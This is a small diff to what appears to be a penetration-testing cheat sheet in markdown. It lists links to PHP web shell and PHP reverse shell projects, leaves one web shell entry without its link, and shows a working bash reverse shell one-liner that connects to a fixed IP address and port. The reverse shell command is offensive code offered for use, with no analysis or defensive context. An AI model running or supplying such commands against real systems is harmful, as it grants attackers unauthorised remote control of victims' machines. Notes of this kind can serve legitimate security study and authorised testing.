@@ -1,7 +1,9 @@
 ## Web shells 
 [phpbash web shell](https://github.com/Arrexel/phpbash) 
+
 [pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell) 
-[pwney web shell](
+
+[pwney web shell]
 
 ## Reverse shell commands  
     bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
